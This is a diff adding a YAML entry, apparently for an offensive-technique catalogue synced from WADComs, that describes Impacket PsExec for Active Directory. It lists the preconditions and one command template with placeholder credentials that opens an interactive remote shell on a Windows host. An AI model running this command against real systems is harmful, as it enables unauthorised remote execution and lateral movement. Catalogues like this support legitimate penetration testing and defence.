@@ -1,0 +1,30 @@
+id: wadcoms/impacket-psexec
+type: technique
+platform: active-directory
+name: Impacket PsExec
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- a valid password
+- a valid username
+commands:
+- template: python3 psexec.py test.local/john:password123@10.10.10.1
+  comment: 'Impacket''s psexec.py offers psexec like functionality. This will give you an interactive
+    shell on the Windows host. Command Reference: Target IP: 10.10.10.1 Domain: test.local Username: john
+    Password: password123'
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
+- https://www.sans.org/blog/psexec-python-rocks/
+tags:
+- active-directory
+- wadcoms
+- smb
